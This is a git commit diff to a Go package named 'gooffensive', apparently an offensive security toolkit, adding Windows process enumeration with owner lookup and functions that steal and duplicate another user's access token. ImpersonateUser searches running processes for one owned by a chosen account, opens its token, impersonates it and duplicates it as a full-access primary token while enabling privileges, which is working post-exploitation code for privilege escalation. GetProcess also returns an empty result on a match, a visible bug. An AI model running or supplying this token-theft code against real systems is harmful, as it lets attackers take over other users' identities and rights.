5e7d27798943d37fe91c138a3582b273ac24c63f
lesnuages <1799430+lesnuages@users.noreply.github.com>
2019-04-14 15:22:04 +0200

    Add process and user impersonation

--- pkg/gooffensive/process/process_windows.go
+++ pkg/gooffensive/process/process_windows.go
@@ -6,18 +6,42 @@ import (
 	"unsafe"
 )
 
+// WindowsProcess represents a process object
+type WindowsProcess struct {
+	Pid        uint32
+	PPid       uint32
+	Executable string
+	Owner      string
+}
+
 // GetProcess takes in a process name OR a process ID and returns a pointer to the process handle, the process name,
 // and the process ID. If both a process name and a PID are provided, the PID is used.
-func GetProcess(name string, pid uint32) (string, uint32, error) {
-	//https://github.com/mitchellh/go-ps/blob/master/process_windows.go
-
+func GetProcess(name string, pid uint32) (WindowsProcess, error) {
+	p := WindowsProcess{}
 	if pid <= 0 && name == "" {
-		return "", 0, fmt.Errorf("a process name OR process ID must be provided")
+		return p, fmt.Errorf("a process name OR process ID must be provided")
 	}
+	procs, err := GetProcesses()
+	if err != nil {
+		return p, err
+	}
+	for _, proc := range procs {
+		if pid > 0 && proc.Pid == pid {
+			return p, nil
+		} else if proc.Executable == name {
+			return p, nil
+		}
+	}
+	return p, fmt.Errorf("could not find a procces with the supplied name \"%s\" or PID of \"%d\"", name, pid)
+}
 
+// GetProcesses returns a list of all the running processes
+func GetProcesses() (procs []WindowsProcess, err error) {
+	//https://github.com/mitchellh/go-ps/blob/master/process_windows.go
+	procs = make([]WindowsProcess, 0)
 	snapshotHandle, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
 	if snapshotHandle < 0 || err != nil {
-		return "", 0, fmt.Errorf("there was an error creating the snapshot:\r\n%s", err)
+		return procs, fmt.Errorf("there was an error creating the snapshot:\r\n%s", err)
 	}
 	defer syscall.CloseHandle(snapshotHandle)
 
@@ -25,30 +49,83 @@ func GetProcess(name string, pid uint32) (string, uint32, error) {
 	process.Size = uint32(unsafe.Sizeof(process))
 	err = syscall.Process32First(snapshotHandle, &process)
 	if err != nil {
-		return "", 0, fmt.Errorf("there was an accessing the first process in the snapshot:\r\n%s", err)
+		return procs, fmt.Errorf("there was an accessing the first process in the snapshot:\r\n%s", err)
 	}
 
 	for {
-		processName := ""
-		// Iterate over characters to build a full string
+		p := WindowsProcess{}
 		for _, chr := range process.ExeFile {
 			if chr != 0 {
-				processName = processName + string(int(chr))
+				p.Executable = p.Executable + string(int(chr))
 			}
 		}
-		if pid > 0 {
-			if process.ProcessID == pid {
-				return processName, pid, nil
-			}
-		} else if name != "" {
-			if processName == name {
-				return name, process.ProcessID, nil
-			}
-		}
+		p.PPid = process.ParentProcessID
+		p.Pid = process.ProcessID
+		p.Owner, _ = getProcessOwner(p.Pid)
+		procs = append(procs, p)
+
 		err = syscall.Process32Next(snapshotHandle, &process)
 		if err != nil {
 			break
 		}
 	}
-	return "", 0, fmt.Errorf("could not find a procces with the supplied name \"%s\" or PID of \"%d\"", name, pid)
+	return
+}
+
+// Helper functions
+
+// getInfo retrieves a specified type of information about an access token.
+func getInfo(t syscall.Token, class uint32, initSize int) (unsafe.Pointer, error) {
+	n := uint32(initSize)
+	for {
+		b := make([]byte, n)
+		e := syscall.GetTokenInformation(t, class, &b[0], uint32(len(b)), &n)
+		if e == nil {
+			return unsafe.Pointer(&b[0]), nil
+		}
+		if e != syscall.ERROR_INSUFFICIENT_BUFFER {
+			return nil, e
+		}
+		if n <= uint32(len(b)) {
+			return nil, e
+		}
+	}
+}
+
+func getTokenUser(t syscall.Token) (*syscall.Tokenuser, error) {
+	i, e := getInfo(t, syscall.TokenUser, 50)
+	if e != nil {
+		return nil, e
+	}
+	return (*syscall.Tokenuser)(i), nil
+}
+
+// getTokenOwner retrieves access token t owner account information.
+func getTokenOwner(t syscall.Token) (*syscall.Tokenuser, error) {
+	i, e := getInfo(t, syscall.TokenOwner, 50)
+	if e != nil {
+		return nil, e
+	}
+	return (*syscall.Tokenuser)(i), nil
+}
+
+func getProcessOwner(pid uint32) (owner string, err error) {
+	handle, err := syscall.OpenProcess(syscall.PROCESS_QUERY_INFORMATION, false, pid)
+	if err != nil {
+		return
+	}
+	var token syscall.Token
+	if err = syscall.OpenProcessToken(handle, syscall.TOKEN_QUERY, &token); err != nil {
+		return
+	}
+	tokenUser, err := getTokenUser(token)
+	if err != nil {
+		tokenUser, err = getTokenOwner(token)
+		if err != nil {
+			return
+		}
+	}
+	owner, domain, _, err := tokenUser.User.Sid.LookupAccount("")
+	owner = fmt.Sprintf("%s\\%s", domain, owner)
+	return
 }
--- pkg/gooffensive/token/token_windows.go
+++ pkg/gooffensive/token/token_windows.go
@@ -1,15 +1,78 @@
-package gooffensive
+package token
 
 import (
+	"log"
 	"syscall"
 	"unsafe"
 
+	"github.com/lesnuages/gooffensive/pkg/gooffensive/process"
 	"golang.org/x/sys/windows"
 )
 
 const (
-	SE_PRIVILEGE_ENABLED = uint32(0x00000002)
+	SE_PRIVILEGE_ENABLED   = uint32(0x00000002)
+	SecurityAnonymous      = 0
+	SecurityIdentification = 1
+	SecurityImpersonation  = 2
+	SecurityDelegation     = 3
+	TokenPrimary           = 1
+	TokenImpersonation     = 2
+	SYNCHRONIZE            = 0x00100000
 )
+
+// ImpersonateUser loops over all the running process and calls ImpersonateProcess
+// in an attempt to retrieve a token belonging to the `username` user.
+func ImpersonateUser(username string) (newToken syscall.Token, err error) {
+	p, err := process.GetProcesses()
+	if err != nil {
+		return
+	}
+	for _, proc := range p {
+		if proc.Owner == username {
+			newToken, err = ImpersonateProcess(proc.Pid)
+			if err != nil {
+				// Couldn't grab the token
+				continue
+			} else {
+				// Got token
+				return
+			}
+		}
+	}
+	return
+}
+
+// ImpersonateProcess duplicates a primary token belonging to a process.
+func ImpersonateProcess(pid uint32) (newToken syscall.Token, err error) {
+	var attr syscall.SecurityAttributes
+	var requiredPrivileges = []string{"SeAssignPrimaryTokenPrivilege", "SeIncreaseQuotaPrivilege"}
+	primaryToken, err := getPrimaryToken(pid)
+
+	if err != nil {
+		log.Println("getPrimaryToken failed:", err)
+		return
+	}
+	defer primaryToken.Close()
+
+	err = impersonateLoggedOnUser(*primaryToken)
+	if err != nil {
+		log.Println("impersonateLoggedOnUser failed:", err)
+		return
+	}
+	err = duplicateTokenEx(*primaryToken, syscall.TOKEN_ALL_ACCESS, &attr, SecurityDelegation, TokenPrimary, &newToken)
+	if err != nil {
+		log.Println("duplicateTokenEx failed:", err)
+		return
+	}
+	for _, priv := range requiredPrivileges {
+		err = SePrivEnable(priv)
+		if err != nil {
+			log.Println("Failed to set priv", priv)
+			return
+		}
+	}
+	return
+}
 
 // SePrivEnable adjusts the privileges of the current process to add the passed in string. Good for setting 'SeDebugPrivilege'
 func SePrivEnable(s string) error {
@@ -67,4 +130,48 @@ func SePrivEnable(s string) error {
 		return e
 	}
 	return nil
+}
+
+// Helper functions
+
+func getPrimaryToken(pid uint32) (*syscall.Token, error) {
+	handle, err := syscall.OpenProcess(syscall.PROCESS_QUERY_INFORMATION, true, pid)
+	if err != nil {
+		log.Println("OpenProcess failed")
+		return nil, err
+	}
+	defer syscall.CloseHandle(handle)
+	var token syscall.Token
+	if err = syscall.OpenProcessToken(handle, syscall.TOKEN_DUPLICATE|syscall.TOKEN_ASSIGN_PRIMARY|syscall.TOKEN_QUERY, &token); err != nil {
+		log.Println("OpenProcessToken failed")
+		return nil, err
+	}
+	return &token, err
+}
+
+func impersonateLoggedOnUser(hToken syscall.Token) (err error) {
+	modadvapi32 := syscall.MustLoadDLL("advapi32.dll")
+	procImpersonateLoggedOnUser := modadvapi32.MustFindProc("ImpersonateLoggedOnUser")
+	r1, _, err := procImpersonateLoggedOnUser.Call(uintptr(hToken))
+	if r1 != 0 {
+		return nil
+	}
+	return
+}
+
+func duplicateTokenEx(hExistingToken syscall.Token, dwDesiredAccess uint32, lpTokenAttributes *syscall.SecurityAttributes, impersonationLevel uint32, tokenType uint32, phNewToken *syscall.Token) (err error) {
+	modadvapi32 := syscall.MustLoadDLL("advapi32.dll")
+	procDuplicateTokenEx := modadvapi32.MustFindProc("DuplicateTokenEx")
+	r1, _, err := procDuplicateTokenEx.Call(
+		uintptr(hExistingToken),
+		uintptr(dwDesiredAccess),
+		uintptr(unsafe.Pointer(lpTokenAttributes)),
+		uintptr(impersonationLevel),
+		uintptr(tokenType),
+		uintptr(unsafe.Pointer(phNewToken)),
+	)
+	if r1 != 0 {
+		return nil
+	}
+	return
 }
